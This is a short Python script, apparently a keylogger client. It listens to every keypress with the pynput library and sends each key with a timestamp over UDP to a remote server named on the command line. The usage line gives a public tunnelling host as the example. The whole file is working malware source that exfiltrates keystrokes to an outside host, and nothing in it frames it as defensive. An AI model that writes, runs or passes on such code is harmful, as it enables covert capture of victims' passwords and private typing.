import socket
from pynput import keyboard
import datetime
import sys

if len(sys.argv) != 3:
    print("Usage: python client.py <server_hostname> <port>")
    print("Example: python client.py rnpoq-2405-4803-c93c-ba20-9600-2a8d-e9fe-237.a.free.pinggy.link 50982")
    sys.exit(1)

UDP_IP = sys.argv[1]
UDP_PORT = int(sys.argv[2])

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def on_press(key):                                             
    try:
        sock.sendto((str(key) + " " + datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')).encode(), (UDP_IP, UDP_PORT))
    except Exception as e:
        print(e)

    if key == keyboard.Key.esc:
        return False

def main():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()